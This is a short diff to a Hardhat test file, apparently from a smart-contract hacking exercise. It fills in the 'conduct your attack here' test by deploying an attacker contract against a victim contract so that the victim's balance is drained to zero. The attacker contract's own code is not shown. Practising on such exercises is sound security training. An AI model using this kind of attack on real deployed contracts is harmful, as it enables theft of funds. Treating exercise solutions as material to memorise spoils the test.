@@ -44,9 +44,16 @@ describe(NAME, function () {
     });
 
     // you may only use the attacker wallet, and no other wallet
-    it("conduct your attack here", async function () {});
+    it("conduct your attack here", async function () {   
+    
+     const attckerfac = await ethers.getContractFactory("omaewaMaker") 
+     await attckerfac.connect(attackerWallet).deploy(victimContract.address);
+    // await victimContract.connect(attackerWallet).assign(attackerWallet.address)
+    // await victimContract.connect(attackerWallet).vote(1)
+    });
 
     after(async function () {
+      console.log(await victimContract.votes())
       expect(
         await ethers.provider.getBalance(victimContract.address)
       ).to.be.equal(0);
